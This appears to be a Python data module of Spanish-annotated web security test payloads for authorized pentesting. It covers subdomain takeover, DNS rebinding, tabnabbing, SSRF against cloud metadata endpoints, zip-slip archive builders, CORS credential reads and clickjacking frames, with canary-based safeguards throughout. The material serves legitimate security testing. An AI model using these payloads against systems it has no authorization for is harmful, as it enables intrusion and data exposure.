"""Bancos de payloads y artefactos de infraestructura para entornos autorizados."""

OW_SUB = 'https://cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html'
OW_SSRF = 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html'
PS = 'https://portswigger.net/web-security/'
ZIP = 'https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/'
AWS = 'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html'
GCP = 'https://docs.cloud.google.com/compute/docs/metadata/querying-metadata'
AZURE = 'https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service'
PATT_DNS = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md'


def B(nivel, titulo, lenguaje, codigo, nota, fuente):
    return (nivel, titulo, lenguaje, codigo.strip(), nota, fuente)


BANCOS = {
    'subdomain-takeover': [
        B('basicos', 'Registros que pueden quedar colgantes', 'bash', """
dig +short CNAME {SUBDOMINIO_AUTORIZADO}
dig +short A {SUBDOMINIO_AUTORIZADO}
dig +short AAAA {SUBDOMINIO_AUTORIZADO}
dig +short NS {SUBDOMINIO_AUTORIZADO}
""", 'Un registro colgante es candidato; reclamarlo depende de verificación y reglas del proveedor.', OW_SUB),
        B('basicos', 'Comprobación del destino CNAME', 'bash', """
dig +short A {DESTINO_CNAME}
dig +short AAAA {DESTINO_CNAME}
dig +short TXT {SUBDOMINIO_AUTORIZADO}
""", 'NXDOMAIN o ausencia de TXT no prueban control por terceros; contrastar con documentación del proveedor.', OW_SUB),
        B('contextos', 'Respuesta HTTP y TLS del host', 'bash', """
curl -sS -D - -o /dev/null "https://{SUBDOMINIO_AUTORIZADO}/"
openssl s_client -connect {SUBDOMINIO_AUTORIZADO}:443 -servername {SUBDOMINIO_AUTORIZADO} </dev/null
""", 'Ejecutar una línea cada vez. Un error o certificado inválido solo identifica estado; no establece reclamabilidad.', OW_SUB),
        B('avanzados', 'Prueba inocua de control cuando esté permitida', 'text', """
Recurso propio reservado: {RECURSO_CANARY}
Host: {SUBDOMINIO_AUTORIZADO}
Cuerpo publicado: takeover-proof-{NONCE}
Retirada: eliminar DNS huérfano o transferir el recurso al propietario.
""", 'La demostración requiere autorización explícita para asociar el subdominio; no dejarlo liberado al terminar.', 'https://wstg.owasp.org/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover/'),
    ],
    'dns-rebinding': [
        B('basicos', 'Dominio propio con dos respuestas', 'text', """
{DOMINIO_REBIND_PROPIO}  A  {IP_PUBLICA_PROPIA}      TTL=1
{DOMINIO_REBIND_PROPIO}  A  {IP_PRIVADA_LAB_PROPIA}  TTL=1 (después)
""", 'Cronología de respuestas, no archivo de zona. Las dos IP deben ser propias; un resolver puede imponer TTL mínimo o fijar resolución.', PATT_DNS),
        B('basicos', 'Observar resolución desde el cliente', 'bash', """
dig {DOMINIO_REBIND_PROPIO} A +noall +answer
dig {DOMINIO_REBIND_PROPIO} AAAA +noall +answer
""", 'Estas consultas solo confirman el DNS de prueba, no que la aplicación sea vulnerable.', PATT_DNS),
        B('contextos', 'URL entregada a un fetch permitido', 'text', """
{"url":"http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary"}
?callback=http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary
""", 'Son alternativas. Registrar IP efectiva de la conexión en el servidor de laboratorio.', PS+'ssrf'),
        B('avanzados', 'Revalidación tras una redirección', 'http', """
HTTP/1.1 302 Found
Location: http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/segunda
Connection: close
Content-Length: 0

""", 'Tras servir este 302, cambiar el A del mismo dominio de IP pública propia a IP privada de laboratorio. Confirmar segunda resolución y conexión reales; el 302 aislado no prueba rebinding.', OW_SSRF),
    ],
    'tabnabbing': [
        B('basicos', 'Enlace externo que abre nueva pestaña', 'html', """
<a href="https://{DESTINO_PROPIO}/canary" target="_blank">Abrir prueba</a>
""", 'Los navegadores modernos suelen aplicar noopener implícito; medir window.opener en el navegador real.', 'https://community.owasp.org/attacks/Reverse_Tabnabbing'),
        B('basicos', 'Control explícito con noopener', 'html', """
<a href="https://{DESTINO_PROPIO}/canary" target="_blank"
   rel="noopener noreferrer">Abrir prueba</a>
""", 'Control negativo: la pestaña nueva debería observar window.opener === null.', 'https://community.owasp.org/attacks/Reverse_Tabnabbing'),
        B('contextos', 'Apertura programática desde clic propio', 'javascript', """
document.querySelector("#{BOTON_PROPIO}").addEventListener("click", () => {
  window.open("https://{DESTINO_PROPIO}/canary", "_blank");
});
""", 'Ejecutar en la pestaña original para evitar bloqueo de popups; COOP y noopener pueden cortar la referencia.', 'https://community.owasp.org/attacks/Reverse_Tabnabbing'),
        B('contextos', 'Medición en la página abierta', 'javascript', """
console.log(window.opener === null ? "sin-opener" : "con-opener");
""", 'Ejecutar en la página propia /canary recién abierta; una referencia no demuestra por sí sola navegación o impacto.', 'https://community.owasp.org/attacks/Reverse_Tabnabbing'),
        B('avanzados', 'Prueba de navegación inocua de la pestaña original', 'javascript', """
if (window.opener) {
  window.opener.location = "https://{DESTINO_PROPIO}/proof/{NONCE}";
}
""", 'Solo en dos ventanas propias. No suplantar un login ni recolectar credenciales.', 'https://community.owasp.org/attacks/Reverse_Tabnabbing'),
    ],
    'information-disclosure': [
        B('basicos', 'Archivos de configuración y control de versiones', 'text', """
/.env
/.env.bak
/config.json.bak
/.git/HEAD
/.git/config
""", 'Una respuesta 200 de SPA no cuenta; detenerse y redactar si aparece un secreto real.', PS+'information-disclosure/exploiting'),
        B('basicos', 'Artefactos de JavaScript y fuente', 'text', """
/static/app.js.map
/assets/app.js.map
/robots.txt
/uploads/
""", 'Un mapa o lista de rutas es inventario hasta demostrar exposición de información privada.', PS+'information-disclosure'),
        B('contextos', 'Errores y debug de una ruta propia', 'http', """
POST /api/v1/test HTTP/1.1
Host: {ORIGEN}
Content-Type: application/json

{
""", 'Un error de parser puede mostrar stack trace; verificar sensibilidad del dato, no solo el código 500.', PS+'information-disclosure/exploiting'),
        B('avanzados', 'Buscar nombres sin imprimir valores', 'bash', r"""
rg -l -i '(secret|token|password|api[_-]?key)' ./dist
git log --all --name-only --pretty=format: | rg -i '(\.env|secret|credential)'
""", 'Solo sobre copia autorizada. Reportar rutas y prueba redactada, nunca publicar credenciales.', PS+'information-disclosure'),
    ],
    'security-misconfiguration': [
        B('basicos', 'Cabeceras de respuestas relevantes', 'text', """
Strict-Transport-Security
Content-Security-Policy
X-Content-Type-Options
Cache-Control
X-Frame-Options
""", 'Revisar respuestas finales de funciones sensibles; ausencia aislada no demuestra impacto.', 'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html'),
        B('basicos', 'Lectura rápida de cabeceras', 'bash', """
curl -s -D - -o /dev/null "https://{ORIGEN}/account"
curl -s -D - -o /dev/null "https://{ORIGEN}/api/v1/me"
""", 'La ruta privada requiere sesión propia; la respuesta anónima puede ser distinta.', 'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html'),
        B('contextos', 'Cache de una respuesta autenticada', 'http', """
GET /api/v1/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
""", 'Observar Cache-Control, Vary y una lectura desde B propio antes de declarar mezcla de sesiones.', 'https://api-security.owasp.org/editions/2023/en/0xa8-security-misconfiguration/'),
        B('avanzados', 'Método TRACE y debug acotado', 'text', """
TRACE / HTTP/1.1
Host: {ORIGEN}
X-Canary: {NONCE}

GET /{RUTA_PROPIA}?debug=true
""", 'Un eco TRACE o stack genérico no basta: documentar efecto explotable y política del programa.', PS+'information-disclosure/exploiting'),
    ],
    'cloud-metadata-ssrf': [
        B('basicos', 'AWS: rutas de identidad no sensible', 'text', """
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://[fd00:ec2::254]/latest/meta-data/instance-id
""", 'Solo en instancia propia. IPv6 depende de Nitro y subred compatible; no consultar credenciales.', AWS),
        B('basicos', 'GCP: rutas de instancia no sensibles', 'text', """
http://metadata.google.internal/computeMetadata/v1/instance/id
http://169.254.169.254/computeMetadata/v1/instance/id
""", 'Solo proyecto propio. Ambas formas requieren Metadata-Flavor: Google; no consultar service-accounts.', GCP),
        B('basicos', 'Azure: ruta de ubicación', 'text', """
http://169.254.169.254/metadata/instance/compute/location?api-version=2025-04-07&format=text
""", 'Solo VM propia; requiere Metadata: true. La región no demuestra permisos de gestión.', AZURE),
        B('contextos', 'GCP: cabecera obligatoria', 'http', """
GET /computeMetadata/v1/instance/id HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
""", 'Un SSRF que solo controla la URL normalmente no puede aportar esta cabecera. No pedir tokens de cuenta de servicio.', GCP),
        B('contextos', 'Azure: versión y cabecera obligatorias', 'http', """
GET /metadata/instance/compute/location?api-version=2025-04-07&format=text HTTP/1.1
Host: 169.254.169.254
Metadata: true
""", 'Un SSRF que solo controla la URL normalmente no puede aportar Metadata: true. Probar desde VM propia.', AZURE),
        B('avanzados', 'IMDSv2: diferencia entre GET y PUT', 'http', """
GET /latest/meta-data/instance-id HTTP/1.1
Host: 169.254.169.254

PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 60
Content-Length: 0

GET /latest/meta-data/instance-id HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: {TOKEN_IMDS_PROPIO}
""", 'Tres solicitudes secuenciales en instancia propia: GET sin token debe dar 401 si IMDSv2 es obligatorio; conservar el token solo en memoria y no imprimirlo.', AWS),
    ],
    'zip-slip': [
        B('basicos', 'Nombres de entrada que salen de la raíz', 'text', r"""
../canary-{NONCE}.txt
../../canary-{NONCE}.txt
..\canary-{NONCE}.txt
/tmp/canary-{NONCE}.txt
""", 'Son nombres dentro del archivo comprimido, no URLs. Las barras inversas importan sobre todo en Windows; algunas librerías eliminan la barra inicial. Usar sandbox y canary nuevo.', ZIP),
        B('basicos', 'Crear un ZIP con canary de recorrido', 'python', """
import zipfile
with zipfile.ZipFile("canary-{NONCE}.zip", "x") as z:
    z.writestr("../canary-{NONCE}.txt", "prueba controlada")
""", 'Extraer solo en laboratorio; comprobar ruta final normalizada y ausencia de sobrescritura.', ZIP),
        B('contextos', 'TAR con una entrada relativa al padre', 'python', """
import io, tarfile
with tarfile.open("canary-{NONCE}.tar", "x") as tar:
    data = b"prueba controlada"
    info = tarfile.TarInfo("../canary-{NONCE}.txt")
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))
""", 'Una aplicación puede usar librerías distintas para ZIP y TAR; verificar ambos solo si los acepta.', ZIP),
        B('avanzados', 'Escape por symlink de laboratorio', 'text', """
Raíz: ./salida
Symlink propio: ./salida/enlace -> ../
Entrada ZIP: enlace/canary-{NONCE}.txt
""", 'La validación debe considerar la ruta final real. No apuntar a archivos preexistentes.', 'https://developer.android.com/privacy-and-security/risks/zip-path-traversal'),
    ],
    'cors-credenciales': [
        B('basicos', 'Orígenes a probar uno por solicitud', 'text', """
Origin: https://{ORIGEN_CONTROLADO}
Origin: null
Origin: https://{DOMINIO_CONFIABLE}.{ORIGEN_CONTROLADO}
Origin: http://{SUBDOMINIO_CONFIABLE}
Origin: https://{SUBDOMINIO_CONFIABLE}:8443
""", 'Una línea por solicitud; origen incluye esquema, host y puerto. El prefijo confiable bajo {ORIGEN_CONTROLADO} es dominio propio; HTTP confiable exige control/intercepción real. Comprobar cookies y respuesta privada.', PS+'cors'),
        B('basicos', 'Cabeceras de lectura y caché', 'text', """
Access-Control-Allow-Origin: https://{ORIGEN_CONTROLADO}
Access-Control-Allow-Credentials: true
Vary: Origin
""", 'ACAO exacto y ACAC:true habilitan lectura si el navegador envía la cookie y la respuesta es privada. Vary: Origin importa al cachear ACAO dinámico; ACAO:* queda bloqueado.', PS+'cors/access-control-allow-origin'),
        B('contextos', 'Prueba en navegador sin imprimir el perfil', 'javascript', """
fetch("https://{ORIGEN}/api/v1/me", {credentials:"include"})
  .then(async r => console.log({status:r.status,
    canary:(await r.text()).includes("prueba-123")}))
  .catch(e => console.log(e.name));
""", 'Colocar prueba-123 antes en el perfil de la cuenta propia y ejecutar desde origen controlado. Registrar solo el booleano, nunca el cuerpo.', PS+'cors'),
        B('avanzados', 'Preflight para cabecera Authorization', 'http', """
OPTIONS /api/v1/me HTTP/1.1
Host: {ORIGEN}
Origin: https://{ORIGEN_CONTROLADO}
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization
""", 'Un preflight aceptado no basta: confirmar petición real y que el navegador disponga del token.', PS+'cors'),
    ],
    'clickjacking-framing': [
        B('basicos', 'Políticas que impiden framing', 'text', """
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
""", 'Son configuraciones alternativas; verificar la respuesta de la acción sensible en navegador.', PS+'clickjacking'),
        B('basicos', 'Iframe visible de laboratorio', 'html', """
<iframe src="https://{ORIGEN}/account/settings"
        width="900" height="600"></iframe>
""", 'Confirmar que sesión propia y cookies permiten enmarcar la ruta; un iframe visible es solo control.', PS+'clickjacking'),
        B('contextos', 'Marcador de alineación sin interceptar clics', 'html', """
<iframe src="https://{ORIGEN}/account/settings"
        style="position:absolute;top:0;left:0;width:900px;height:600px;opacity:.6"></iframe>
<div style="position:absolute;top:80px;left:80px;pointer-events:none">
  CANARY-{NONCE}
</div>
""", 'Ajustar coordenadas en laboratorio; el marcador no intercepta el clic. Probar solo acción reversible de cuenta propia.', PS+'clickjacking'),
        B('avanzados', 'Sandbox frente a defensa JavaScript', 'html', """
<iframe sandbox="allow-forms allow-scripts"
        src="https://{ORIGEN}/account/settings"></iframe>
""", 'Puede cambiar cookies, navegación y frame busters. Solo hay hallazgo si se completa una acción protegida.', PS+'clickjacking'),
    ],
}
